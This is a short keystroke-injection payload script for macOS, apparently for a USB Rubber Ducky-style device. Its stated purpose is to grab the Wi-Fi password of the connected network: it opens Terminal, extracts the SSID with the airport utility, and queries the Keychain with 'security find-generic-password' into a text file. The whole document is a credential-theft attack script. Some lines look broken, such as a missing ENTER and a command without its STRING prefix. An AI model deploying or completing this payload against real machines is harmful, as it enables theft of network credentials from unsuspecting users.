REM Purpose: Grab the wifi password for the currently connected network
REM Notes: OSX

DELAY 100
COMMAND SPACE
DELAY 500
STRING terminal

REM --> Get Info for Current Interface and Network
STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport --getinfo >> getinfo.txt
ENTER

REM --> Filter SSID
STRING cat getinfo.txt | awk -F ' SSID:' '{print $2}' | sed '/^$/d' | awk '{$1=$1};1' >> ssid.txt
DELAY 500

Rem --> Set SSID Variable
STRING SSID=$( cat ssid.txt )
DELAY 500

REM --> Get Security Info With Password (requires username and password)
security find-generic-password -ga "$SSID" >> password.txt
